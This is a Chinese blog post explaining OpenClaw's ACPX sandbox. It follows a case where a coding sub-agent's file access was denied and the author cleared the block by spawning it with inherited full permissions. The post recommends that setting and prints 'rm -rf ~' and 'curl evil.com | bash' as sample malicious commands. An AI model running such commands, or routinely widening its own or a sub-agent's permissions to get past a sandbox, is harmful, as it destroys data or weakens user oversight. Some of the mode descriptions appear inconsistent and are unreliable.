---
title: "OpenClaw ACPX 权限系统详解：从一次权限拒绝错误说起"
pubDatetime: 2026-03-21T13:30:00Z
tags: ['openclaw', 'security', 'acpx', 'agent', '权限管理']
description: '记录一次 OpenCode 子代理权限问题的排查过程，深入解析 ACPX 安全沙箱的工作原理和配置实践'
---

# OpenClaw ACPX 权限系统详解：从一次权限拒绝错误说起

> **摘要**: 今天在迁移 115 篇博客文章时，遇到了 OpenCode 子代理权限被拒绝的问题。这篇文章记录了完整的排查过程，并深入解析 OpenClaw 的 ACPX 安全架构。

---

## 📖 问题背景

今天我想把 `clean-vercel-blog` 仓库的 115 篇博客文章迁移到新的 Astro Paper 博客。由于涉及大量 frontmatter 格式转换（日期转换、字段清理、格式统一等），我决定让 OpenCode 来处理这个任务。

### 第一次尝试

```bash
# 启动 OpenCode 子代理
sessions_spawn(
  agentId: "opencode",
  runtime: "acp",
  task: "修复所有博客文章的 frontmatter 格式"
)
```

### 错误信息

```
Permission denied by ACP runtime (acpx). 
ACPX blocked a write/exec permission request in a non-interactive session. 
Configure plugins.entries.acpx.config.permissionMode to one of: approve-reads, approve-all, deny-all.
```

**OpenCode 根本没开始工作就被拦住了！**

---

## 🔍 问题排查

### 检查会话状态

```bash
# 查看 OpenCode 会话状态
cat ~/.openclaw/agents/opencode/sessions/sessions.json | jq '.["agent:opencode:acp:5451f096"]'
```

输出：

```json
{
  "state": "error",
  "lastError": "Permission denied by ACP runtime (acpx)..."
}
```

### 检查进程

```bash
ps aux | grep -E "opencode|acp"
# 没有 OpenCode 进程在运行
```

**结论**: OpenCode 启动时尝试访问文件，被 ACPX 直接拦截，任务根本没开始执行。

---

## 🏗️ ACPX 是什么？

**ACPX** = **Agent Communication Protocol Extension**

它是 OpenClaw 的**安全沙箱层**，负责管理子代理（sub-agent）的权限。

### 架构图解

```
┌─────────────────────────────────────────────────────┐
│  你 (用户)                                           │
│  Discord #github-page                               │
└────────────────┬────────────────────────────────────┘
                 │ 消息
                 ▼
┌─────────────────────────────────────────────────────┐
│  OpenClaw Main Agent                                │
│  - 接收你的请求                                      │
│  - 决定是否需要子代理                                │
│  - 调用 sessions_spawn                               │
└────────────────┬────────────────────────────────────┘
                 │ spawn
                 ▼
┌─────────────────────────────────────────────────────┐
│  ACPX Runtime (安全层) ⭐                            │
│  - 创建隔离会话                                      │
│  - 监控文件访问                                      │
│  - 拦截危险命令 (rm, curl, etc.)                    │
│  - 请求权限批准                                      │
└────────────────┬────────────────────────────────────┘
                 │ 代理执行
                 ▼
┌─────────────────────────────────────────────────────┐
│  OpenCode (子代理)                                  │
│  - 实际执行任务                                      │
│  - 读写文件 ~/cloudzun.github.io/                   │
│  - 运行 npm run build                               │
└─────────────────────────────────────────────────────┘
```

---

## 🛡️ 为什么需要 ACPX？

### 没有 ACPX 的风险

想象一下，如果子代理可以随意执行任何命令：

```python
# 恶意代码示例
import os
os.system("rm -rf ~")  # 😱 删除所有文件！
os.system("curl evil.com | bash")  # 😱 下载并执行恶意脚本！
```

### ACPX 的保护机制

```
OpenCode 尝试：rm -rf ~/cloudzun.github.io/src/data/blog/*
     ↓
ACPX 拦截：⚠️ 危险操作！需要用户批准
     ↓
你收到通知：[APPROVE] 允许删除文件？[DENY] 拒绝
```

**ACPX 就像公司前台保安**，每个想进办公室的人都要登记！

---

## 🎯 Sandbox 模式详解

OpenClaw 提供三种沙箱模式：

### 1. `require` (默认，最严格)

```yaml
sessions_spawn:
  agentId: opencode
  runtime: acp
  # 不指定 sandbox，默认 require
  # ↓
  # 所有文件访问和命令执行都需要批准
```

**适用场景**: 不信任的代码、第一次使用的子代理

### 2. `inherit` (继承父会话权限)

```yaml
sessions_spawn:
  agentId: opencode
  runtime: acp
  sandbox: inherit  # ✅ 继承父会话的权限
  # ↓
  # 父会话能做的，子代理都能做
```

**适用场景**: 信任的子代理（如 OpenCode、Claude Code）

### 3. 其他配置

```json
{
  "plugins": {
    "entries": {
      "acpx": {
        "config": {
          "permissionMode": "approve-reads"  // 读操作需批准
          // 或 "approve-all" (所有操作需批准)
          // 或 "deny-all" (禁止所有操作)
        }
      }
    }
  }
}
```

---

## ✅ 解决方案

### 修复代码

```python
# 原始代码（失败）
sessions_spawn(
  agentId="opencode",
  mode="run",
  runtime="acp",
  task="修复博客文章 frontmatter"
)

# 修复后（成功）
sessions_spawn(
  agentId="opencode",
  mode="run",
  runtime="acp",
  task="修复博客文章 frontmatter",
  sandbox="inherit"  # ✅ 关键！继承权限
)
```

### 验证结果

```bash
# 检查会话状态
cat ~/.openclaw/agents/opencode/sessions/sessions.json | jq '.["agent:opencode:acp:4d0ed021"]'
```

输出：

```json
{
  "state": "running",  # ✅ 正常运行中
  "acpxRecordId": "ses_2ef7828c2ffe2VheX5csxICp4r"
}
```

---

## 📊 权限模式对比

| 模式 | 文件读取 | 文件写入 | 命令执行 | 适用场景 |
|------|---------|---------|---------|---------|
| `require` | ❌ 需批准 | ❌ 需批准 | ❌ 需批准 | 不信任代码 |
| `inherit` | ✅ 继承 | ✅ 继承 | ✅ 继承 | 信任的子代理 |
| `approve-reads` | ❌ 需批准 | ✅ 允许 | ✅ 允许 | 只读敏感 |
| `deny-all` | ❌ 禁止 | ❌ 禁止 | ❌ 禁止 | 纯计算任务 |

---

## 💡 最佳实践

### 1. 明确声明权限需求

```yaml
# ✅ 好的做法
sessions_spawn:
  agentId: opencode
  sandbox: inherit  # 明确声明需要继承权限
  task: |
    请修改 ~/cloudzun.github.io/ 目录下的文件
    需要运行 npm run build

# ❌ 不好的做法
sessions_spawn:
  agentId: opencode
  # 不指定 sandbox，默认 require
  # 然后等权限错误
```

### 2. 最小权限原则

```yaml
# 只读任务，不需要写权限
sessions_spawn:
  agentId: opencode
  task: "分析代码结构"
  # 使用默认 require 即可

# 需要写权限
sessions_spawn:
  agentId: opencode
  task: "修复代码问题"
  sandbox: inherit  # 明确声明
```

### 3. 监控子代理行为

```bash
# 查看子代理日志
cat ~/.openclaw/agents/opencode/sessions/*.jsonl | jq '.[] | select(.role="tool")'

# 检查当前运行的子代理
openclaw agent list
```

---

## 🔧 实际案例：博客迁移

### 任务描述

迁移 115 篇博客文章，需要：

1. 读取源文件（`/tmp/clean-vercel-blog/content/posts/*.md`）
2. 解析 frontmatter（YAML）
3. 转换格式（日期、标签、字段）
4. 写入目标文件（`~/cloudzun.github.io/src/data/blog/`）
5. 运行构建命令（`npm run build`）

### 权限需求分析

| 操作 | 权限类型 | 需求 |
|------|---------|------|
| 读取源文件 | 文件读取 | ✅ 必需 |
| 写入目标文件 | 文件写入 | ✅ 必需 |
| 运行 npm | 命令执行 | ✅ 必需 |
| 删除临时文件 | 文件删除 | ⚠️ 可选 |

**结论**: 需要 `sandbox: inherit` 模式

### 最终代码

```python
sessions_spawn(
  agentId="opencode",
    mode="run",
    runtime="acp",
    sandbox="inherit",  # ✅ 关键配置
    task="""
    请帮我修复 ~/cloudzun.github.io/src/data/blog/ 目录下所有 Markdown 文章的 frontmatter 格式问题。
    
    需要：
    1. 日期格式转换 (date → pubDatetime, UTC 转换)
    2. 删除不需要的字段 (draft, categories)
    3. 格式统一 (引号转换)
    4. 添加缺失的 description 字段
    5. 运行 npm run build 验证
    
    源文件参考：https://github.com/cloudzun/clean-vercel-blog
    """
)
```

---

## 🎓 知识延伸

### ACPX 与其他沙箱对比

| 沙箱系统 | 平台 | 特点 |
|---------|------|------|
| ACPX | OpenClaw | 基于会话的权限继承 |
| Docker | 通用 | 容器级隔离 |
| Firecracker | AWS Lambda | 微虚拟机隔离 |
| gVisor | Kubernetes | 用户空间内核 |

**ACPX 的优势**: 轻量级、与 OpenClaw 深度集成、权限模型灵活

### 安全边界

```
┌─────────────────────────────────────┐
│  沙箱外 (你的系统)                   │
│  - 完整文件系统访问                  │
│  - 所有系统调用                      │
└─────────────────────────────────────┘
              │
              │ ACPX 边界
              ▼
┌─────────────────────────────────────┐
│  沙箱内 (子代理)                     │
│  - 受限的文件访问                    │
│  - 受限的系统调用                    │
│  - 所有操作被记录                    │
└─────────────────────────────────────┘
```

---

## 📝 总结

### 核心要点

1. **ACPX 是 OpenClaw 的安全沙箱**，保护你的系统免受恶意子代理侵害
2. **默认模式 `require` 最严格**，所有操作需批准
3. **信任的子代理用 `inherit`**，继承父会话权限
4. **明确声明权限需求**，不要等错误发生

### 经验教训

- ❌ **错误做法**: 启动子代理时不指定 `sandbox`，等权限错误
- ✅ **正确做法**: 根据任务需求，明确声明 `sandbox: inherit`

### 一句话总结

> **ACPX 就像公司门禁系统，子代理需要"门禁卡"（`sandbox: inherit`）才能正常工作！**

---

## 🔗 参考资料

- [OpenClaw 文档](https://docs.openclaw.ai)
- [ACPX 配置指南](https://docs.openclaw.ai/guides/acpx)
- [sessions_spawn API](https://docs.openclaw.ai/api/sessions_spawn)
- [GitHub: cloudzun.github.io](https://github.com/cloudzun/cloudzun.github.io)

---

**作者**: CloudZun  
**标签**: #OpenClaw #ACPX #安全 #Agent #权限管理  
**发布时间**: 2026-03-21 13:30 UTC
